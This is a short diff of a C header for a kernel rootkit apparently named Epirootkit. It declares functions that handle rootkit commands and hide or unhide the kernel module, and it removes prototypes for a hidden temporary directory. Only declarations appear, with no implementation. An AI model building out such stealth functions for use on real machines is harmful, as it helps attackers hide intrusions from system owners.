@@ -56,8 +56,4 @@ int rootkit_command(char *command, unsigned command_size);	// Handle commands re
 int hide_module(void);										// Hide the module from the kernel
 int unhide_module(void);									// Unhide the module in the kernel
 
-// fs.c
-int create_hidden_tmp_dir(void);							// Create a hidden temporary directory
-int remove_hidden_tmp_dir(void);							// Remove the hidden temporary directory
-
 #endif // EPIROOTKIT_H
